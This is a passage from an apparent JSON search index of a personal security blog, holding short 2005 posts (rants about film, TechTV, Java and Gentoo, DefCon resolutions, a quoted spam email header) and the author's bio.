raving at the lunatics that are making this STUPID IDEA a reality, here is a little background: I got home today and checked Engadget like always and I see this: Bond to fly solo without Q in Casino Royale? which led me to this blog: No Gadgets For New James Bond . I did some more research and found out that Casino Royale is already a DVD on Amazon. It was a 1967 FARCE to make fun of 007: Editorial Reviews of “Casino Royale” 1967 Amazon.com John Huston was only one of five directors on this expensive, all-star 1967 spoof of Ian Fleming’s 007 lore. David Niven is the aging Sir James Bond, called out of retirement to take on the organized threat of SMERSH and pass on the secret-agent mantle to his idiot son (Woody Allen). An amazing cast (Orson Welles, Peter Sellers, Deborah Kerr, etc.) is wonderful to look at, but the film is not as funny as it should be, and the romping starts to look mannered after awhile. The musical score by Burt Bacharach, however, is a keeper. –Tom Keogh Well, if you want to watch the REAL BOND. Check out this list on Amazon for all the REAL Bond movies: Listmania! All the Bond Movies ** Here is the official news from BBC: James Bond writer ‘reinvents’ spy** To all the Bonds of old. We salute you. (And hope you don’t have to suffer through watching this movie) jd ","date":"2005-09-19","objectID":"https://malicious.link/posts/2005/2005-09-19-reinvention-of-007-back-to-the-future-really-dumb-idea/:0:0","tags":null,"title":"Reinvention of 007 + Back to the future = Really dumb idea","uri":"https://malicious.link/posts/2005/2005-09-19-reinvention-of-007-back-to-the-future-really-dumb-idea/"},{"categories":["rant"],"content":"Are you guys trying to tell me something? I’m the dork at prom who hasn’t noticed the “Kick Me” sign on his back. What exactly is making ya’ll run away with lightning speed? Come on, be the stand up person and tell me. (For the Ashley Park people out there. This means LEAVE A COMMENT) ","date":"2005-09-19","objectID":"https://malicious.link/posts/2005/2005-09-19-616-hits-no-comments/:0:0","tags":null,"title":"616 Hits. No comments","uri":"https://malicious.link/posts/2005/2005-09-19-616-hits-no-comments/"},{"categories":["techtv","podcasts"],"content":"LADIES AND GENTLEMEN, I am proud to announce that TechTV, the cable television channel that we know and USED to love might just be making a comeback. In an ‘Aliens’ sort of revival, a year and a half after they were pwnd ‘merged’, might be popping out on top of G4. For starters they are bringing back “Call for Help” with Leo Leporte. First seen on KevinRose.com which is a blog written by, yup you guessed it Kevin Rose, the next move is that the G4 Founder and CEO who engineered the dumbass move ‘merger’ has been FIRED! released. There are so many blogs and IRC channels that are DEDICATED to bringing back TechTV that it surprises me that the suits over at G4 took this long to get the message. Click here to vote for how much you like Charles Hirschhorn To learn more about the FORMER TechTV killer click HERE for his Bio at G4’s about page. Tell me what you think about the issue. Post a comment. Come back to us jd ","date":"2005-09-17","objectID":"https://malicious.link/posts/2005/2005-09-17-techtv-back-from-the-dead/:0:0","tags":null,"title":"TechTV back from the dead?","uri":"https://malicious.link/posts/2005/2005-09-17-techtv-back-from-the-dead/"},{"categories":null,"content":"I have officially determined 12 hour shifts suck. Whoever invented this crazy idea needs to be shot! Oh! I’ve got an idea! Instead of 3 people per day, which allowed all three to have proper recoup time, lets make it just 2 on a 12 on, 12 off schedule! We can use that employee somewhere else! Sound like an issue of Dilbert? Yeah, I thought so too. ","date":"2005-09-17","objectID":"https://malicious.link/posts/2005/12-hour-shifts/:0:0","tags":["rant"],"title":"12 Hour Shifts","uri":"https://malicious.link/posts/2005/12-hour-shifts/"},{"categories":null,"content":"It’s a big rave across the internet, so Room362.Com is jumping on the band wagon. (So I’m about a year late, give me a break) If you want to be cool be R362 Approved! ","date":"2005-09-06","objectID":"https://malicious.link/posts/2005/r362-approved/:0:0","tags":["button","internet"],"title":"R362 Approved","uri":"https://malicious.link/posts/2005/r362-approved/"},{"categories":null,"content":"I went to see The Transporter 2 tonight. Normally I watch movies using an ‘alternative’ method, but for action movies it is really hard to get into it without the 13 speakers blaring heart pumping music into your face for a eyeball warping experience. I have to admit, that this movie was great, but if it had not been for the fantastic sound effects, music, and overall audible feel to the movie, I would have thought less of it. The only bad part of the movie that I didn’t like was that they added a huge gap between realities. In the first movie, you were left thinking, “Hmm, do people actually do this?” In this movie you start wondering when Van Dam and The Govenator are going to start breaking down doors. Overall good performances though. Good job Frank. Transporter 2 - Click for Trailer ","date":"2005-09-05","objectID":"https://malicious.link/posts/2005/transporter-2/:0:0","tags":["movie review"],"title":"Transporter 2","uri":"https://malicious.link/posts/2005/transporter-2/"},{"categories":null,"content":"Yes that is right, you heard it here first! BADFOO.NET is up! I’m not saying that they (he) has content up yet, except for a pic of a hacked up HP. But I have assigned a couple reporters to this story and I will keep updates as this page evolves. ","date":"2005-09-03","objectID":"https://malicious.link/posts/2005/badfoo-net/:0:0","tags":["badfoo","duder"],"title":"Badfoo.net","uri":"https://malicious.link/posts/2005/badfoo-net/"},{"categories":null,"content":" This and more Atom Smasher’s Error Message Gallery ","date":"2005-08-16","objectID":"https://malicious.link/posts/2005/new-advanced-error-system-for-windows-vista/:0:0","tags":["rant"],"title":"New \"Advanced\" Error system for Windows Vista","uri":"https://malicious.link/posts/2005/new-advanced-error-system-for-windows-vista/"},{"categories":null,"content":"Let me be the first to welcome Gentoo into the 21st Century. Creating an Installer instead of a 40 page ‘Handbook’ was a bold and innovative move. In this bold move they have enticed new blood to this awesome distro such as the renowned Silent_Bob who now goes under the alias thesb to avoid FBI and CIA warrants, but that is another story altogether. (Which I will follow-up on if you, the reader, comment and tell me to) But back to Gentoo. USE flags as CHECK BOXES! ’nuf said. ","date":"2005-08-16","objectID":"https://malicious.link/posts/2005/gentoo-enters-the-21st-century/:0:0","tags":["rant","gentoo","linux"],"title":"Gentoo enters the 21st Century","uri":"https://malicious.link/posts/2005/gentoo-enters-the-21st-century/"},{"categories":null,"content":"Ok, yes, again. It has been a while. But I am back. I got a new Wireless PCMCIA card (ORiNOCO a/b/g Combo Card Gold). So far it is a great card. WEP craking FTW ","date":"2005-08-14","objectID":"https://malicious.link/posts/2005/wep/:0:0","tags":["wireless","wep"],"title":"WEP","uri":"https://malicious.link/posts/2005/wep/"},{"categories":null,"content":"Age of Empires II - Age of Kings. That is a great game. It has something that not a lot of games have these days, which is replay value. Once you beat a game, that is it. No more fun. You know all the secrets. That is where MMORPG came into the picture. But still most of them are still lacking. You can get to Level 60 or Level 70 and you have reached the top. You get stuck. So how does one make the prefect game? Easy make it last forever. Now you want to know how you do that? Aren’t you selfish! Do I have to tell you everything? Well since you aren’t going to answer me I’ll just assume that you mean yes. Well you make a game last forever by making it a game that you play with your buddies, with your friends. Make it a social event basically. Now I don’t expect a game to start dispensing beer (although that would be a great feat). But make it something that rivals going out to… say the mall when you are bored, or even a movie theatre. Now, you have to make it enjoyable. Make computer rivals so you can co-op with your buddy. Make more levels of difficulty than Easy, Medium, and Hard (and Legendary). Call MIT and ask for a AI with some ooomph. Put cheats in the game. For some people, cheating makes the game MORE enjoyable. For others, it does not. But at least give them the option to do it. Well, except in multiplayer mode. hmm more later… ","date":"2005-08-12","objectID":"https://malicious.link/posts/2005/back-to-the-basics/:0:0","tags":["rant","gaming"],"title":"Back to the Basics","uri":"https://malicious.link/posts/2005/back-to-the-basics/"},{"categories":null,"content":"Right now I am taking a class called “Intro to Programming”. And yup! you guessed it! The first assignment is to make a Hello World program. For those who don’t know, that is the Globally accepted first assignment for programming languages, be it HTML, Java, C++, PHP, python, or Assembly. Now this is where I get to voice my opinion of Java so far: It bites! Any language that makes you write 3 lines of code just to print “Hello World” is stupid. And another thing! You have to be EXACT on every command you do or your screwed, and WTF is a Class path, why the hell do you get so many errors if you don’t specify one? Stupid. Sorry, rage gone (Dr Pepper system is restored). Suggestion to all those who are taking Intro to programming, START WITH PYTHON. ","date":"2005-08-07","objectID":"https://malicious.link/posts/2005/intro-to-programming-java/:0:0","tags":["programming","college"],"title":"Intro to Programming (Java)","uri":"https://malicious.link/posts/2005/intro-to-programming-java/"},{"categories":null,"content":"Here is the source of the email I got (new hacking sytle, brute force spamming) : From - Mon Aug 01 00:51:54 2005 Received: from andylau.net (andylau-net.mr.outblaze.com [205.158.62.181]) by cpe-066-056-247-120.ec.res.rr.com (Postfix) with ESMTP id CACB489394 for \u003csgrduklhaergt@room362.com\u003e; Sun, 31 Jul 2005 12:08:10 -0700 From: \"Pancakes O. Making\" \u003criel@andylau.net\u003e To: Sgrduklhaergt \u003csgrduklhaergt@room362.com\u003e Subject: hi Date: Sun, 31 Jul 2005 12:08:10 -0700 Message-ID: \u003c001101c59603$b5b7b45d$2c4260db@andylau.net\u003e MIME-Version: 1.0 Content-Type: text/plain Content-Transfer-Encoding: 7bit X-Priority: 3 (Normal) X-MSMail-Priority: Normal X-Mailer: Microsoft Outlook, Build 10.0.2616 Importance: Normal X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000 X-AntiVirus: OK! AntiVir MailGate Version 2.0.1; AVE: 6.15.0.0; VDF: 6.15.0.6 X-RCPT-TO: \u003csgrduklhaergt@room362.com\u003e Status: U X-UIDL: 412837401 \u003cb\u003ehi dude! i just wanted to test your e-mail\u003c/b\u003e\u003c/i\u003e Why would someone ’test your email’ to a extremely random user? ","date":"2005-08-01","objectID":"https://malicious.link/posts/2005/brute-force-spam/:0:0","tags":["internet"],"title":"Brute Force Spam","uri":"https://malicious.link/posts/2005/brute-force-spam/"},{"categories":null,"content":"To celebrate the close of DefCon 13 here are my… New Defcon (14) Resolutions. Get l0gic a girl to take to DefCon Get duder out to the east coast Make and print Project Mentor T-Shirts to give away and wear to DefCon Create a DCMar Group Watch Family Guy and Futurerama episodes as instructed by l0gic Get BFA w/ Card ","date":"2005-08-01","objectID":"https://malicious.link/posts/2005/defcon-resolutions/:0:0","tags":["defcon","conference","duder"],"title":"Defcon Resolutions","uri":"https://malicious.link/posts/2005/defcon-resolutions/"},{"categories":null,"content":"Well, I finally got a working CMS type deal going on for a blog. I was going to write one but decided not to. Call it lazy or standing on the shoulders of programming gods, you choose. ","date":"2005-07-31","objectID":"https://malicious.link/posts/2005/done/:0:0","tags":["first"],"title":"Done","uri":"https://malicious.link/posts/2005/done/"},{"categories":null,"content":" I lost my brother in 2005. This page is dedicated to him. ","date":"2005-05-21","objectID":"https://malicious.link/brandon/:0:0","tags":null,"title":"Brandon","uri":"https://malicious.link/brandon/"},{"categories":null,"content":"Slides Video ","date":"0001-01-01","objectID":"https://malicious.link/posts/2022/00-beautiful-basics-footer/:0:0","tags":null,"title":"","uri":"https://malicious.link/posts/2022/00-beautiful-basics-footer/"},{"categories":null,"content":"Lessons Learned Lesson 1 Lesson 2 Lesson 3 Lesson 4 Lesson 5 Lesson 6 Lesson 7 Lesson 8 Lesson 9 Lesson 10 Lesson 11 ","date":"0001-01-01","objectID":"https://malicious.link/posts/2022/00-beautiful-basics-header/:0:1","tags":null,"title":"","uri":"https://malicious.link/posts/2022/00-beautiful-basics-header/"},{"categories":null,"content":" Mubix \"Rob\" Fuller Hack the Box: Rob has over 17 years of experience covering all facets of information security. He has been behind the lines helping to design, build, and defend the US Marine Corps, US Senate, and Pentagon networks - as well as performing penetration tests and Red Team engagements against those same networks. More recently, Rob has built and led numerous Red Teams in successful engagements against many of the Fortune 50 companies, representing some of the best defensive teams in the industry. Rob’s experience and expertise ranges from embedded and wireless devices in ICS/OT networks to standard IT infrastructures. He is a frequent speaker and trainer at a number of well-known security conferences. He has also served as a senior technical advisor for HBO’s show Silicon Valley. Rob has acquired a number of certifications and awards over the years, but the ones he holds above the rest are father, husband, and United States Marine. ","date":"0001-01-01","objectID":"https://malicious.link/about/:0:0","tags":null,"title":"About Me","uri":"https://malicious.link/about/"},{"categories":null,"content":"Some of my favorite quotes Denzel Washington Dreams without goals are just dream that are ultimately fuel for disappointment. On the road to achieving your dreams, you must apply dicipline, but more importantly consistency, because without commitment you’ll never start, but without consistency, you’ll never finish. ","date":"0001-01-01","objectID":"https://malicious.link/about/:0:1","tags":null,"title":"About Me","uri":"https://malicious.link/about/"}]